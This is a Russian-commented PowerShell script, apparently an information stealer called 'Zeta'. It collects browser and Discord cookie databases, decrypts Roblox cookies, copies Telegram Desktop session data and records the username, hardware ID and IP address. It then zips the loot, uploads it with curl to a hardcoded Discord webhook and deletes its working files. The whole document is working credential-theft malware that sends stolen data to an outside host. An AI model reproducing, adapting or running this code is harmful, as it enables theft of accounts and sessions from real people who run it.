$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"

# ===== ОТЛАДКА =====
$log = "$env:TEMP\zeta_debug.log"
"=== ZETA DEBUG ===" | Out-File $log -Force
"1. Скрипт запущен $(Get-Date)" | Out-File $log -Append
Write-Host "1. Скрипт запущен" -ForegroundColor Cyan

# ===== ПАПКА =====
$d = "$env:TEMP\Zeta_Cookies"
try {
    md $d -Force | Out-Null
    "2. Папка создана: $d" | Out-File $log -Append
    Write-Host "2. Папка создана: $d" -ForegroundColor Green
} catch {
    "❌ Ошибка создания папки: $_" | Out-File $log -Append
    Write-Host "❌ Ошибка создания папки: $_" -ForegroundColor Red
    Read-Host "Нажми Enter"
    exit
}

# ===== ПОИСК COOKIES =====
$found = @()
$searchPaths = @($env:APPDATA, $env:LOCALAPPDATA, (Join-Path $env:LOCALAPPDATA '..\LocalLow'))
"3. Пути поиска: $searchPaths" | Out-File $log -Append

foreach ($base in $searchPaths) {
    try {
        if (Test-Path $base) {
            $files = Get-ChildItem -Path $base -Recurse -Filter 'Cookies' -File -ErrorAction SilentlyContinue |
                Where-Object { 
                    $_.DirectoryName -and ($_.DirectoryName -match 'discord|chrome|edge|brave|opera|vivaldi|firefox|mozilla|ntfloader|ebwebview|webview' -or $_.FullName -match 'Cookies$')
                }
            if ($files) { 
                $found += $files
                "4. Найдено файлов: $($files.Count) в $base" | Out-File $log -Append
                Write-Host "4. Найдено файлов: $($files.Count) в $base" -ForegroundColor Green
            }
        }
    } catch {
        "⚠️ Ошибка в пути $base : $_" | Out-File $log -Append
    }
}

"5. Всего найдено файлов: $($found.Count)" | Out-File $log -Append
Write-Host "5. Всего найдено файлов: $($found.Count)" -ForegroundColor Cyan

if ($found.Count -eq 0) {
    "⚠️ НЕ НАЙДЕНО НИ ОДНОГО ФАЙЛА COOKIES!" | Out-File $log -Append
    Write-Host "⚠️ НЕ НАЙДЕНО НИ ОДНОГО ФАЙЛА COOKIES!" -ForegroundColor Red
}

# ===== КОПИРОВАНИЕ COOKIES =====
$goldenKey = $null
$goldenSeal = $null
$filesCopied = 0

foreach ($f in $found) {
    try {
        if (-not $f) { continue }
        $src = $f.FullName
        $name = "unknown_cookie.cookies"
        try {
            if ($f.Directory.Parent -and $f.Directory.Name) {
                $name = $f.Directory.Parent.Name + '_' + $f.Directory.Name + '.cookies'
            } elseif ($f.Directory.Name) {
                $name = $f.Directory.Name + '.cookies'
            }
            if ($name.Length -gt 60 -and $f.Directory.Parent -and $f.Directory.Parent.Parent -and $f.Directory.Parent.Name) {
                $name = $f.Directory.Parent.Parent.Name + '_' + $f.Directory.Parent.Name + '.cookies'
            }
        } catch {
            $name = [System.IO.Path]::GetFileName($src) + '_' + (Get-Random -Max 9999) + '.cookies'
        }
        $dest = Join-Path $d $name
        Copy-Item -Path $src -Destination $dest -Force -ErrorAction Stop 
        $filesCopied++
        "6. Скопирован: $name" | Out-File $log -Append

        # Пробуем найти golden_key
        try {
            Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dest;Version=3;Read Only=True;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT value FROM cookies WHERE name = 'golden_key' LIMIT 1;"
            $result = $cmd.ExecuteScalar()
            if ($result -and $result -ne $null) {
                $goldenKey = $result
                $goldenKey | Out-File "$d\golden_key.txt" -Force
                "7. Найден golden_key в $name" | Out-File $log -Append
                Write-Host "7. Найден golden_key" -ForegroundColor Green
            }
            $conn.Close()
        } catch {
            # Молча скипаем
        }
        
    } catch {
        "⚠️ Ошибка копирования $($f.FullName) : $_" | Out-File $log -Append
        Write-Host "⚠️ Ошибка копирования: $_" -ForegroundColor Red
    }
}

"8. Скопировано файлов: $filesCopied" | Out-File $log -Append
Write-Host "8. Скопировано файлов: $filesCopied" -ForegroundColor Cyan

# ===== ROBLOX =====
try {
    $rob = $env:LOCALAPPDATA + '\Roblox\LocalStorage\RobloxCookies.dat'
    if (Test-Path $rob) {
        Copy-Item $rob "$d\RobloxCookies.dat" -Force -ErrorAction SilentlyContinue
        "9. Roblox файл скопирован" | Out-File $log -Append
        try {
            $c = Get-Content $rob -Raw | ConvertFrom-Json -ErrorAction Stop
            if ($c -and $c.CookiesData) {
                $b = [Convert]::FromBase64String($c.CookiesData)
                Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
                $s = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser')
                $t = [Text.Encoding]::UTF8.GetString($s)
                $t | Out-File "$d\RobloxCookies_decrypted.txt" -ErrorAction SilentlyContinue
                "10. Roblox расшифрован" | Out-File $log -Append
                Write-Host "10. Roblox расшифрован" -ForegroundColor Green
            }
        } catch {
            "⚠️ Ошибка расшифровки Roblox: $_" | Out-File $log -Append
            Write-Host "⚠️ Ошибка расшифровки Roblox: $_" -ForegroundColor Red
        }
    } else {
        "⚠️ Roblox файл не найден" | Out-File $log -Append
    }
} catch {
    "⚠️ Ошибка Roblox: $_" | Out-File $log -Append
}

# ===== TELEGRAM =====
try {
    $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
    if (Test-Path $tgPath) {
        $tgDest = "$d\Telegram_tdata"
        md $tgDest -Force | Out-Null
        Start-Process -FilePath "robocopy" -ArgumentList "`"$tgPath`" `"$tgDest`" /E /COPY:DAT /R:1 /W:1 /NP /NFL /NDL" -Wait -NoNewWindow -WindowStyle Hidden
        if ((Get-ChildItem $tgDest -Recurse -File -ErrorAction SilentlyContinue).Count -eq 0) {
            Copy-Item -Path "$tgPath\*" -Destination $tgDest -Recurse -Force -ErrorAction SilentlyContinue
        }
        "11. Telegram tdata скопирован" | Out-File $log -Append
        Write-Host "11. Telegram tdata скопирован" -ForegroundColor Green
    } else {
        "⚠️ Telegram tdata не найден" | Out-File $log -Append
    }
} catch {
    "⚠️ Ошибка Telegram: $_" | Out-File $log -Append
}

# ===== ИНФО =====
try {
    $u = $env:USERNAME
    try {
        $h = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    } catch {
        $h = "UNKNOWN_HWID"
    }
    try {
        $i = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -ErrorAction Stop).Content
    } catch {
        $i = "IP_NOT_FOUND"
    }
    "User: $u`nHWID: $h`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue
    "12. Инфо о системе сохранена" | Out-File $log -Append
} catch {
    "⚠️ Ошибка сбора инфо: $_" | Out-File $log -Append
}

# ===== АРХИВ =====
try {
    $zip = "$env:TEMP\cookies.zip"
    if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
    Compress-Archive -Path $d -DestinationPath $zip -Force -ErrorAction SilentlyContinue
    "13. Архив создан: $zip" | Out-File $log -Append
    Write-Host "13. Архив создан" -ForegroundColor Green
} catch {
    "❌ Ошибка архивации: $_" | Out-File $log -Append
    Write-Host "❌ Ошибка архивации: $_" -ForegroundColor Red
}

# ===== ОТПРАВКА =====
try {
    if (Test-Path $zip) {
        curl.exe -F "file=@$zip" $webhook
        "14. Отправлено через curl" | Out-File $log -Append
        Write-Host "14. Отправлено через curl" -ForegroundColor Green
    } else {
        "❌ Архив не создался" | Out-File $log -Append
        Write-Host "❌ Архив не создался" -ForegroundColor Red
    }
} catch {
    "❌ Ошибка отправки: $_" | Out-File $log -Append
    Write-Host "❌ Ошибка отправки: $_" -ForegroundColor Red
}

# ===== ЧИСТКА =====
try {
    Remove-Item $zip -Force -ErrorAction SilentlyContinue
    Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
    "15. Чистка выполнена" | Out-File $log -Append
} catch {
    "⚠️ Ошибка чистки: $_" | Out-File $log -Append
}

"16. Скрипт завершен $(Get-Date)" | Out-File $log -Append
Write-Host "✅ Скрипт завершен! Лог: $log" -ForegroundColor Cyan
Read-Host "Нажми Enter для выхода"
